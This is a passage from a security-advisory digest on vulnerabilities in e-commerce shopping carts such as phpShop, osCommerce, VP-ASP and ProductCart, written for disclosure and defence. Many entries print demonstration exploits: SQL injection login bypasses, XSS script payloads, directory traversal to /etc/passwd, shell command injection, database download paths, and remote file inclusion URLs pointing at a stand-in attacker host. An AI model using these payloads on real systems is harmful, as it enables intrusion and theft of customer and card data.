A remote user can view files on the system with the privileges of the web service.

A remote user can obtain potentially sensitive PHP and Perl configuration information.
Solution: No solution was available at the time of this entry.

Title: Q-Shop ASP Shopping Cart Input Validation Holes Let Remote Users Inject SQL Commands
Impact: Execution of arbitrary code via network
Description:
Some vulnerabilities were reported in Q-Shop.  A remote user can inject SQL commands and can conduct cross-site scripting attacks.
S-Quadra reported that the search.asp, browse.asp, details.asp, showcat.asp, users.asp, addtomylist.asp, modline.asp, cart.asp, and newuser.asp scripts do not properly validate user-supplied input.  A remote user can inject SQL commands to be executed by the underlying database.  A remote user may be able to execute arbitrary commands on the target system by invoking the xp_cmdshell function.

It is also reported that the imagezoom.asp and recommend.asp scripts do not filter HTML code from user-supplied input before displaying information based on the input.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Q-Shop software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. 

The vendor was reportedly notified on January 16 2004.
Impact':
A remote user can inject SQL commands and execute operating system commands on the target system.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Q-Shop software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: DUpaypal Authentication Flaw Lets Remote Users Gain Administrative Access to the Application
Description:
Security Corporation reported vulnerabilities in DUpaypal, as well as in many other DUware applications.  A remote user can gain administrative access on the application.
It is reported that a remote user can directly access certain scripts that do not require authentication but provide access to administrative functions.

Frog-m@n is credited with discovering this flaw.

The following notification timeline is provided:

10/01/2004 Vulnerability discovered
12/01/2004 Vendor notified
14/01/2004 Vendor response
14/01/2004 Security Corporation clients notified
14/01/2004 Started e-mail discussions
17/01/2004 Last e-mail received
20/01/2004 Public disclosure
Impact': A remote user can gain administrative access to the application.
Solution:
The vendor has released a fixed version (3.1), available at:

http://www.duware.com/products/download.asp?iPro=13&iCat=13&nCat=E-Commerce

Title: DUamazon Authentication Flaw Lets Remote Users Gain Administrative Access to the Application
Description:
Security Corporation reported vulnerabilities in DUamazon, as well as in many other DUware applications.  A remote user can gain administrative access on the application.
It is reported that a remote user can directly access certain scripts that do not require authentication but provide access to administrative functions.

Frog-m@n is credited with discovering this flaw.

The following notification timeline is provided:

10/01/2004 Vulnerability discovered
12/01/2004 Vendor notified
14/01/2004 Vendor response
14/01/2004 Security Corporation clients notified
14/01/2004 Started e-mail discussions
17/01/2004 Last e-mail received
20/01/2004 Public disclosure
Impact': A remote user can gain administrative access to the application.
Solution:
The vendor has released a fixed version (3.1), available at:

http://www.duware.com/products/download.asp?iPro=11&iCat=13&nCat=E-Commerce

Title: phpShop Multiple Input Validation Flaws Permit SQL Injection, Cross-Site Scripting, and Disclosure of Customer Data
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in phpShop.  A remote user can inject SQL commands.  A remote authenticated user can obtain customer data from the database.  A remote user can also conduct cross-site scripting attacks.
JeiAr of the GulfTech Security Research Team reported that the software does not properly validate some user-supplied variables. A remote user can inject SQL commands to be executed on the underlying database via the 'page' or 'product_id' variables.  Some demonstration exploit URLs are provided:

/?page=[Evil_Query]
/?page=shop/cart&func=cartAdd&product_id=[Evil_Query]
/?page=shop/browse&category_id=&offset=[Evil_Query]

It is also reported that a remote authenticated user can query the 'account/shipto' to gain information about arbitrary customers or the administrator account.  Information that is available reportedly includes the Address Nickname, Company Name, Last Name, First Name, Middle Name, Address, City, State, Zip Code, Country, Telephone, and Fax Number.  A demonstration exploit URL is provided:

/?page=account/shipto&user_info_id=[Valid User ID] 

It is also reported that a remote user can conduct cross-site scripting attacks against users or administrators.  The software reportedly does not filter HTML code from user-supplied input in the shipping information.  A remote user can submit an order with specially crafted shipping information.  Then, when a target administrator views the order, arbitrary scripting code will be executed by the target administrator's browser. The code will originate from the site running the vulnerable software and will run in the security context of that site. As a result, the code will be able to access the target administrator's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target administrator via web form to the site, or take actions on the site acting as the target administrator.

A variety of other cross-site scripting flaws are reported, as the software reportedly echoes many user-supplied variables without validation.  One demonstration exploit URL is provided:

/?page=admin/index&GulfTech="><script>alert(document.cookie)</script>

Many other examples are provided in the Source Message.

The vendor was reportedly notified in early December 2003.
Impact':
A remote user can inject SQL commands to be executed on the underlying database.

A remote user can view potentially sensitive customer data.

A remote user can access the target administrator's cookies (including authentication cookies), if any, associated with the site running the vulnerable software, access data recently submitted by the target administrator via web form to the site, or take actions on the site acting as the target administrator.
Solution: No solution was available at the time of this entry.

Title: Q-Shop Discloses Shopping Database to Remote Users
Description:
A vulnerability was reported in Q-Shop.  A remote user can view the shopping cart database.
It is reported that a remote user can view the shopping cart database file by supplying the following type of URL:

http://[target]/db/store.mdb

The vendor has reportedly been notified.
Impact': A remote user can view the shopping cart database.
Solution:
No solution was available at the time of this entry.

[Editor's note:  In similar vulnerabilities, users have recommended that web server access controls be applied to the affected file or directory to prevent download.]

Title: FishCart Shopping System Integer Overflow Lets Remote Users Trigger Caculation Errors
Description:
An integer overflow vulnerability was reported in the FishCart shopping system.  A remote user can trigger a calculation error.
It is reported that a remote user can specify 'very large quantities' of items to be ordered to trigger an integer overflow and result in negative totals calculated for the order.
Impact': A remote user can cause the shopping cart to calculate negative totals.

Title: FreznoShop Input Validation Flaw in 'search' Variable Permits Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
David Sopas Ferreira at SystemSecure.org reported an input validation vulnerability in FreznoShop.  A remote user can conduct cross-site scripting attacks.
It is reported that the 'search.php' file does not properly validate user-supplied input in the 'search' variable.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the FreznoShop software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://vulnerable/shop/search.php?search=%3Cscript%3Ealert(document.domain);%3C/script%3E
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the FreznoShop software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
The vendor has released a fixed version (1.3.0 RC2), available at:

https://sourceforge.net/project/showfiles.php?group_id=86090

Title: QuikStore Shopping Cart Input Validation Flaw Discloses Files to Remote Users
Description:
Dr`Ponidi of the Indonesia Security Development Team reported vulnerabilities in the QuikStore shopping cart.  A remote user can view files on the system.  A remote user can also determine the installation path.
It is reported that a remote user can supply a specially crafted URL containing '../' directory traversal characters to view arbitrary files on the system with the privileges of the web server process.

Some demonstration exploit URLs are provided:

http://[target]/quikstore.cgi?blah&template=../../../../../../../../../../etc/passwd%00.html
http://[target]/quikstore.cgi?blah&template=../../../../../../../../../../../../etc/hosts
http://[target]/quikstore.cgi?blah&template=../../../../../../../../../../../../usr/bin/id|

It is also reported that a remote user can send a specially crafted request to trigger an error message that discloses the installation path.  A demonstration exploit URL is proivded:

http://[target]/cgi-bin/quikstore.cgi?store='

The vendor has reportedly been notified.
Impact':
A remote user can view arbitrary files on the system with the privileges of the web server process.

A remote user can determine the installation path.
Solution: No solution was available at the time of this entry.

Title: ECW-Shop Input Validation Flaw in 'cat' Permits Remote Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in ECW-Shop in the processing of the 'cat' parameter. A remote user can conduct cross-site scripting attacks.
SecuriTeam credited David S. Ferreira with reporting that the 'cat' parameter does not filter HTML code from user-supplied input before displaying the user-supplied input.

A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the ECW-Shop software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://vulnerablecode/index.php?c=srch&cat=%3Cscript%3Ealert(document.domain);%3C/script%3E
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the ECW-Shop software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: osCommerce 'osCsid' Input Validation Flaw Allows Remote Users to Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in osCommerce. A remote user can conduct cross-site scripting attacks.
JeiAr of the GulfTech Security Research Team reported that the software does not filter the user-supplied 'osCsid' value to remove HTML code before displaying information contained in the variable.

A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the oSCommerce software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

https://path/?osCsid="><iframe src=http://www.gulftech.org></iframe>

The report indicates that the developer has confirmed that both HTTPS and HTTP connections are affected.
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the osCommerce software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

Title: osCommerce Input Validation Flaw in 'create_account_process.php' Permits Remote SQL Injection
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in osCommerce.  A remote user can inject SQL commands.
It is reported that the 'create_account_process.php' file allows a remote user to inject specially crafted SQL commands via the 'country' field.  The 'account_edit_process.php' script also provides access to the vulnerable 'country' field, the author said.  There may be other scripts that provide access, as well.

JeiAr of the GulfTech Security Research Team is credited with discovering this flaw.
Impact': A remote user can execute arbitrary SQL commands on the target system.
Solution:
The author of the report indicates that osCommerce version 2.2-MS2 is not vulnerable, so the vendor was not contacted.  The new version is available at:

http://www.oscommerce.com/downloads

Title: VP-ASP Input Validation Flaws in 'shopsearch' and 'shopdisplayproducts' Let Remote Users Execute Arbitrary Commands
Impact: Execution of arbitrary code via network
Description:
Several input validation vulnerabilities were reported in the VP-ASP shopping cart software.  A remote user can execute arbitrary commands on the target system.
S-Quadra reported that there are SQL injection flaws in 'shopsearch.asp' and 'shopdisplayproducts.asp'.

It is reported that the 'shopsearch.asp' script does not validate or filter user-supplied input before using the input as part of an SQL query.  A remote user can submit a specially crafted query to execute commands with administrative privileges, such as adding a new user account.  A remote user may also be able to execute arbitrary commands.

It is also reported that a remote user can inject SQL commands via the 'shopdisplayproducts.asp' script.  A remote user can read arbitrary information from the database.

Some demonstration exploit examples are provided in the Source Message.

The vendor was reportedly notified on November 28, 2003.
Impact': A remote user can execute arbitrary commands on the target system with the privileges of the target web server.
Solution:
The vendor has released a fix, available at:

http://www.vpasp.com/virtprog/info/faq_securityfixes.htm

Title: AlaCart Shopping Cart Lets Remote Users Gain Administrative Access
Description:
A vulnerability was reported in the AlaCart shopping cart.  A remote user can inject SQL commands to gain administrative access to the application.
SecuriTeam reported that a remote user can supply the following username and password combination when attempting to access an administrative page to gain access to that page:

'or''='

SecuriTeam credis Robert diandro with reporting this flaw.
Impact': A remote user can gain access to administrative pages.
Solution: No solution was available at the time of this entry.

Title: CommerceSQL Shopping Cart Discloses Files to Remote Users
Description:
A vulnerability was reported in the CommerceSQL shopping cart.  A remote user can view files on the system with the privileges of the web server.
It is reported that the 'index.cgi' script does not validate user-supplied input for the 'page' variable.  A remote user can submit a specially crafted HTTP request to view arbitrary files on the system that are readable by the web server process.

A demonstration exploit is provided:

index.cgi?page=../../../../../../../../etc/passwd
Impact': A remote user can view files on the system with the privileges of the web server daemon.
Solution: No solution was available at the time of this entry.

Title: Dansie Shopping Cart Discloses Installation Path to Remote Users
Description:
Dr`Ponidi of Indonesia Security Development Team reported an information disclosure vulnerability in the Dansie Shopping Cart.  A remote user can determine the installation path.
It is reported that a remote user can submit a malformed HTTP request for certain shopping cart files to trigger an error page that discloses the installation path.

A demonstration exploit URL is provided:

http://[target]/cgi-bin/cart.pl?db='

The original advisory is available at:

http://drponidi.5u.com/advisory.htm

The vendor has reportedly been notified.
Impact': A remote user can determine the installation path.
Solution: No solution was available at the time of this entry.

Title: cpCommerce Include File Flaw Lets Remote Users Execute Arbitrary Commands on the Target System
Impact: Execution of arbitrary code via network
Description:
Zone-H reported an include file vulnerability in cpCommerce.  A remote user can execute arbitrary commands on the target server.
The _functions.php file includes some files relevant to the $prefix variable.  A remote user can specify a remote location for the $prefix variable to include and execute arbitrary files on the target server.

A demonstration exploit URL is provided:

http://[target]/path_of_cpcommerce/_functions.php?prefix=http://[attacker]/index

PHP code, including operating system commands, in the remote file will be executed on the target system.  The code will run with the privileges of the target web server process.
Impact': A remote user can execute arbitrary PHP code, including operating system commands, on the target system with the privileges of the target web server.
Solution:
No solution was available at the time of this entry.

The vendor had reportedly issued a fix at the following URL, but at the time of this entry, the vendor had retracted the fix as well as the entire web site:

http://cpcommerce.org/forums/index.php?board=2;action=display;threadid=864

Title: 'PayPal Store Front' Include File Flaw Lets Remote Users Execute Arbitary Code
Impact: Execution of arbitrary code via network
Description:
Astharot of Zone-H reported an include file vulnerability in the PayPal Store Front commerce software.  A remote user can execute arbitrary code on the target system.  [Editor's note:  PayPal Store Front is not a product of PayPal or eBay.]
It is reported that a remote user can invoke the 'index.php' script and specify a remote location for an include file.  The remotely located include file will then be executed on the target system.

A demonstration exploit URL is provided:

http://[target]/index.php?do=ext&page=http://[attacker]/index

The above demonstration exploit URL will include the 'http://[attacker]/index.php' file and execute the commands on the target system.  The code will run with the privileges of the target server.

According to the report, the free version of the software is also affected.

The vendor has reportedly been notified.
Impact': A remote user can execute arbitrary PHP code, including operating system commands, on the target server.  The code will run with the privileges of the target web server process
Solution:
No vendor solution was available at the time of this entry.  An unofficial patch is available at:

http://www.zone-h.org/download/file=4957

Title: 1ASPCommerce Yields Administrative Access to Remote Users
Description:
CyberTalon reported a vulnerability in 1ASPCommerce.  A remote user can gain administrative access on the application.
It is reported that the 'admin.asp' script does not properly authenticate remote users.  A remote user can connect to the administrative control panel without authenticating to the system.  The remote user then has full administrative privileges within the application.

A demonstration exploit URL is provided:

http://[target]/ecommerce/admin/adminLeft/admin.asp
Impact': A remote user can gain administrative privileges on the application.
Solution: No solution was available at the time of this entry.

Title: A-CART Input Validation Flaw in 'signin.asp' Permits Remote Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
G00db0y from Zone-h Security Team reported an input validation vulnerability in A-CART.  A remote user can conduct cross-site scripting attacks.
It is reported that the 'signin.asp' script does not properly filter HTML code from user-supplied input in the 'msg' variable.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the A-CART software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://[target]/acartpath/signin.asp?msg=<script>alert('Zone-h')</script>

The vendor has reportedly been notified.

The original Zone-h advisory is available at:

http://www.zone-h.org/en/advisories/read/id=3156/
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the vulnerable A-CART software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: (Vendor Issues Fix for Italian Version) Re: Q-Shop Shopping Cart Authentication Flaw Lets Remote Users Upload and Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in the Q-Shop ASP-based shopping cart software.  A remote user can upload and execute arbitrary code on the system.
Zone-H reported that a remote user can access an administrative page used to upload files to the server without having to authenticate. The default location of the page is '/qshop/admin/upload.htm'.

A remote user can invoke this page to upload arbitrary code to the web server.  Then, the remote user can cause the web server to execute the code with the privileges of the web server process.

The vendor has reportedly been notified.
Impact': A remote user can upload files containing scripting code to the web server and then cause the web server to execute the code.
Solution:
A patch has been released for the Italian Q-SHOP Euro version.

For more information on the patch, contact the vendor:

http://www.q-shop.it/contatti/

Title: CatalogIntegrator Cart Discloses Credit Card Data and Passwords to Remote Users
Description:
CyberTalon reported a vulnerability in CatalogIntegrator Cart.  A remote user can download the shopping cart database containing credit card data, passwords, and other sensitive information.
It is reported that a remote user can download the shopping cart database stored in the 'expire.mdb' file in the 'config/datasources/' directory.

A demonstration exploit URL is provided:

http://[target]/config/datasources/expire.mdb
Impact': A remote user can obtain the shopping cart database, which contains credit card numbers, names, usernames, and passwords.
Solution: No solution was available at the time of this entry.

Title: GeeeekShop Shopping Cart Discloses Installation Path to Remote Users
Description:
Zone-h Security Team reported a vulnerability in the geeeekShop Shopping Cart.  A remote user can determine the installation path.
A remote user can send a specially crafted HTTP GET request to the target server to cause the target server to disclose the installation path.  A demonstration exploit URL is provided:

http://[target]/shop/?category=xxxxxx&parent=0&page=x&/'

The report states that other HTTP requests can also trigger this flaw, such as the following:

http://[target]/shop/php_files/site.config.php 

The vendor has reportedly been notified.
Impact': A remote user can determine the installation path.
Solution: No solution was available at the time of this entry.

Title: C-Cart Discloses Installation Path to Remote Users
Description:
Zone-H reported an information disclosure vulnerability in C-Cart.  A remote user can determine the installation path.
A remote user can reportedly send a malformed HTTP GET request to cause the system to display an error message that indicates the installation path.

Some demonstration exploit URLs are provided:

http://[target]/shop/search.php?q='
http://[target]/shop/show.php?q='

The vendor has reportedly been notified.
Impact': A remote user can determine the installation path.
Solution: No solution was available at the time of this entry.

Title: Hassan Shopping Cart Discloses Configuration Data to Remote Users
Description:
Dr`Ponidi of the Indonesia Security Development Team reported an information disclosure vulnerability in 'The Shopping Cart' from Hassan Consulting.  A remote user can view the configuration file.
It is reported that a remote user can request the 'shop.cfg' file from the target web site.  A demonstration exploit is provided:

http://[target]/[cgi-local]/shop.pl/page=shop.cfg
Impact': A remote user can view shopping cart configuration data, including the installation path.
Solution: No solution was available at the time of this entry.

Title: eStore Input Validation Flaw Lets Remote Users Inject SQL Commands
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the eStore shopping cart software.  A remote user can inject SQL commands to be executed by the underlying database.  A remote user can also determine the installation path.
1ndonesian Security Team (1st) reported that the '/admin/login.asp' script does not properly filter user-supplied input from the 'user' parameter.  A remote user can inject SQL commands.  A demonstration exploit URL is provided:

http://[target]/admin/login.asp?pass=1st&user<your 0day sql injection code>

It is also reported that a remote user can request the following URL to determine the installation path:

http://[target]/admin/settings.inc.php
Impact': A remote user can execute arbitrary SQL commands on the underlying database.  A remote user can determine the installation path.
Solution:
The vendor has released a patch.

http://www.brooky.com/community/index.php?act=ST&f=9&t=934

Title: .netCART Discloses Credit Card and Other Shopping Cart Information to Remote Users
Description:
An information disclosure vulnerability was reported in .netCART.  A remote user can obtain information about shopping cart users, including passwords and credit card information.
G00db0y at Zone-H reported that in the default configuration, a remote user can view the shopping cart database file with the following type of URL:

http://[target]/Data/dotnetcard.mdb

The vendor has reportedly been notified.

The Zone-H advisory is available at:

http://www.zone-h.org/en/advisories/read/id=2696/
Impact': A remote user can view the entire shopping cart '.mdb' database file.
Solution:
No solution was available at the time of this entry.

The author of the report indicates that as a possible workaround, you can protect the /Data directory on your web server.

Title: CyberShop ASP May Disclose Shopping Cart Database to Remote Users
Description:
Dr`Ponidi reported a vulnerability in the default installation of the CyberShop ASP commerce software.  A remote user can access a diagnostic interface to view information about the system.  In some instances, a remote user can view the shopping cart database.
It is reported that the default configuration permits remote users to access the 'shopdbtest.asp' diagnostic utility.

It is reported that, on some sites, a remote user can download the shopping cart database (*.mdb) and view customer order information, passwords, and other potentially sensitive information.

A demonstration exploit URL is provided:

http://[target]/dir/shopdbtest.asp

[Editor's note:  The vendor has contacted us and disuptes the claim as being "inaccurate" and "totally wrong."  However, we believe we have verified that a remote user can obtain system information from the 'shopdbtest.asp' utility.  We have contacted the author of the report for clarification.]
Impact':
A remote user can view diagnostic system information.  In some cases, a remote user can access the shopping cart database.

[Editor's note:  The vendor disputes these claims.]
Solution:
No solution was available at the time of this entry.

[Editor's note:  The vendor disputes the claim.]

Title: StoreFront ASP Shopping Cart Input Validation Flaw Discloses User Information to Remote Users
Description:
A vulnerability was reported in the StoreFront shopping cart.  A remote user can inject SQL command characters to view information about registered users on the system.
Zone-H reported that a remote user can inject the following characters via the password parameter of the 'login.asp' script to gain user-level access to the database:

' or 'a'='a

By supplying this type of request along with a target user's e-mail address, the remote user can view information about the registered target user.

The vendor has reportedly been notified.
Impact': A remote user can gain access to a target user's personal information.
Solution: No solution was available at the time of this entry.

Title: Q-Shop Shopping Cart Authentication Flaw Lets Remote Users Upload and Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in the Q-Shop ASP-based shopping cart software.  A remote user can upload and execute arbitrary code on the system.
Zone-H reported that a remote user can access an administrative page used to upload files to the server without having to authenticate. The default location of the page is '/qshop/admin/upload.htm'.

A remote user can invoke this page to upload arbitrary code to the web server.  Then, the remote user can cause the web server to execute the code with the privileges of the web server process.

The vendor has reportedly been notified.
Impact': A remote user can upload files containing scripting code to the web server and then cause the web server to execute the code.
Solution:
No solution was available at the time of this entry.

The author of the report has indicated that, as a workaround, you can disable the upload process.

Title: (Vendor Issues Fix) Re: ProductCart Input Validation Flaw Lets Remote Users Inject SQL Commands to Gain Administrative Access
Impact: Execution of arbitrary code via network
Description:
1ndonesian Security Team (1st) reported an SQL injection vulnerability in ProductCart.  A remote user can gain administrative access without supplying authentication credentials.
It is reported that several of the shopping cart's scripts do not properly validate user-supplied input.  A remote user can submit a specially crafted URL to gain administrative access on the application.

For example, a remote user can access the 'login.asp' script with the following type of parameters to be successfully authenticated by the system but without having to supply any authentication credentials:

idadmin='' or 1=1--

The vendor has been notified.
Impact': A remote user can gain administrative access to the application.
Solution:
The vendor has issued a fixed version [within hours of receiving notification].

Customers with ProductCart v2 can replace "pcadmin/login.asp" with a fixed version of login.asp, provided in the Source Message [it is Base64 encoded].

Customers with ProductCart v1.6 should open the file "pcadmin/login.asp" and replace the following lines:

pIdAdmin=replace(request.querystring("IdAdmin"),"'","''")
pAdminPassword=enDeCrypt(request.querystring("adminPassword"), scCrypPass)

with:

pIdAdmin=replace(request.querystring("IdAdmin"),"'","''")
pIdAdmin=replace(pIdAdmin,"--","")
If NOT isNumeric(pIdAdmin) then
response.redirect "msg.asp?message=1"
response.end
end if
pAdminPassword=enDeCrypt(request.querystring("adminPassword"), scCrypPass)

Customers with ProductCart v1.5 and prior versions should contact the vendor immediately to upgrade to a more recent version of ProductCart.

Title: (Vendor Reiterates Secure Configuration Guidance) Re: ProductCart Shopping Cart Default Configuration Lets Remote Users Download the Shopping Database
Description:
An information disclosure vulnerability was reported in the ProductCart shopping cart software (when customers do not follow vendor security guidance). A remote user can download the shopping cart database.
Tri Huynh from Sentry Union reported that, in a default configuration, the shopping cart database is installed in a web-accessible directory '/productcart/database/EIPC.mdb'.  A remote user can reportedly access this file.

According to the report, the database includes the administrator's password, customer information (including credit card details), and other information.
Impact': A remote user can download the shopping cart database to obtain passwords and customer data (if the target site has not properly secured the database).
Solution: The vendor provides security guidance to customers on how to secure the system [although it appears that some customers do not follow the guidance].  A copy of the vendor's instructions is provided in the Source Message and is also available from the vendor.

Title: ProductCart Shopping Cart Default Configuration Lets Remote Users Download the Shopping Database
Description:
An information disclosure vulnerability was reported in the ProductCart shopping cart software.  A remote user can download the shopping cart database.
Tri Huynh from Sentry Union reported that, in a default configuration, the shopping cart database is installed in a web-accessible directory '/productcart/database/EIPC.mdb'.  A remote user can reportedly access this file.

According to the report, the database includes the administrator's password, customer information (including credit card details), and other information.
Impact': A remote user can download the shopping cart database to obtain passwords and customer data.
Solution: No solution was available at the time of this entry.  The author of the report indicates that you can use web server access controls to prevent remote users from downloading the database.

Title: VP-ASP Shopping Cart Input Validation Flaw Lets Remote Users Inject SQL Commands to Gain Administrative Access
Impact: Execution of arbitrary code via network
Description:
1ndonesian Security Team reported an input validation vulnerability in the VP-ASP shopping cart.  A remote user can inject SQL commands to be executed by the underlying database.
It is reported that the 'shopexd.asp' script does not properly filter user-supplied input.  A remote user can supply specially crafted parameters to this script to inject SQL commands that will create a new user that has administrative privileges.

Some demonstration exploit scripts are provided in the Source Message.

The vendor has reportedly been notified.
Impact': A remote user can gain administrative access on the application.
Solution: No solution was available at the time of this entry.

Title: ProductCart Input Validation Flaw Lets Remote Users Inject SQL Commands to Gain Administrative Access
Impact: Execution of arbitrary code via network
Description:
1ndonesian Security Team (1st) reported an SQL injection vulnerability in ProductCart.  A remote user can gain administrative access without supplying authentication credentials.
It is reported that several of the shopping cart's scripts do not properly validate user-supplied input.  A remote user can submit a specially crafted URL to gain administrative access on the application.

For example, a remote user can access the 'login.asp' script with the following type of parameters to be successfully authenticated by the system but without having to supply any authentication credentials:

idadmin='' or 1=1--

The vendor has been notified.
Impact': A remote user can gain administrative access to the application.
Solution: No solution was available at the time of this entry.

Title: CCBill Input Validation Flaw in 'whereami.cgi' Script Permits Remote Operating System Command Execution
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in the CCBill credit card processing software.  A remote user can execute arbitrary commands on the target system.
It is reported that the 'whereami.cgi' script in the 'ccbill' directory lets a remote user submit commands to be executed by the target web server.  A demonstration exploit is provided:

http://victimhost/ccbill/whereami.cgi?g=cat%20../../../../etc/password

According to the report, some web sites using the software have been successfully penetrated.

The report also indicates that other CCBill scripts contain vulnerabilities [but these were not specifically identified in the report].

The vendor has reportedly been notified.
Impact': A remote user can execute arbitrary shell commands on the target system with the privileges of the web server.
Solution: No solution was available at the time of this entry.

Title: Microsoft Commerce Server Discloses SQL Server Password to Local Users
Description:
A vulnerability was reported in Microsoft Commerce Server.  A local user may be able to decode an SQL Server password.
Cesar Cerrudo reported that when the Microsoft Commerce Server is configured to use SQL Server authentication, the Commerce Server stores an SQL Server password in the Windows Registry.  The key is reportedly stored in the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Commerce Server 'ADMINDBPS' registry value.

According to the report, all local users in the 'Users' group can read the regsitry value.  The encoded password can be decoded directly or can be viewed via the Commerce Server application, it was reported.

The vendor was reportedly notified on February 14, 2003.
Impact': A local user can obtain an SQL Server password.
Solution:
No solution was available at the time of this entry.  According to the report, Microsoft plans to issue a knowledge base article describing how to better protect the password.

[Editor's note:  At the time of this entry, we were unable to locate the KB article via a search of the Knowledge Base.

Title: CyberStrong eShop Lets Remote Users Inject SQL Commands
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in CyberStrong's eShop.  A remote user can determine the administrator's username and password.
1ndonesian Security Team reported that several of the scripts contain input validation vulnerabilities, including 10expand.asp, 10browse.asp, and 20review.asp.  A remote user can request a specially crafted URL to cause arbitrary SQL commands to be executed on the underlying database.

Some demonstration exploit URLs are provided:

http://[target]/eshop/10Expand.asp?ProductCode='
http://[target]/eshop/20Review.asp?ProductCode='

The vendor has reportedly been notified.
Impact': A remote user can execute SQL commands to obtain the administrator's username and password.
Solution: No solution was available at the time of this entry.

Title: ProductCart Shopping Cart Input Validation Bug Lets Remote Users Conduct Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
1ndonesian Security Team (1st) reported an input validation vulnerability in the ProductCart ASP-based shopping cart software.  A remote user can conduct cross-site scripting attacks.
It is reported that the 'msg.asp' script does not filter HTML code from user-supplied input when generating error messages.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the ProductCart software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://[target_site_with_sopping_cart_installed]/msg.asp?message=<script>alert('1st')</script>
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the ProductCart software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: The vendor reports that versions 1.6 (released in January 2003) and later contain a fix.  The latest version (v2) is not affected, according to the vendor.

Title: Comersus Shopping Cart Discloses the Commerce Database to Remote Users
Impact: Execution of arbitrary code via network
Description:
1ndonesian Security Team (1st) reported several flaws in the Comersus shopping cart software.  A remote user can view the shopping cart database.  A remote user can also conduct cross-site scripting attacks.
It is reported that the default configuration installs the shopping cart database in a web server directory that can be accessed by remote users.  A demonstration exploit URL is provided:

http://[target_site_with_shopping_cart_installed]/database/comersus.mdb

It is also reported that the comersus_message.asp script does not filter user-supplied HTML when displaying error messages.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Comersus shopping cart software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://[target_site_with_shopping_cart_installed]/comersus_message.asp?message=<script>alert('1st')</script>

The vendor has reportedly been notified without response.
Impact':
A remote user can view the shopping cart database contents.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Comersus software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
No solution was available at the time of this entry.

The report indicates that, as a workaround to the database file disclosure flaw, you can use web server access controls to protect access to the shopping cart database file.

Title: Xpressions Commerce Software Discloses Credit Card Data to Remote Users
Description:
An input validation vulnerability was reported in the Xpressions commerce management software.  A remote user can inject SQL commands to gain administrative access on the application and access credit card data.
It is reported that the 'login.asp' script, and possibly other scripts, do not properly validate user-supplied data.  A remote user can supply specially crafted password values to modify the resulting SQL query.  A remote user can gain administrator access on the application.

A demonstration exploit transcript is provided:

http://[target]/manage/login.asp
User: admin
Pass: ' or '1' = '1

The report also indicates that user information, including user passwords and credit card data, is stored in the database without encryption.  A remote user can obtain this information.

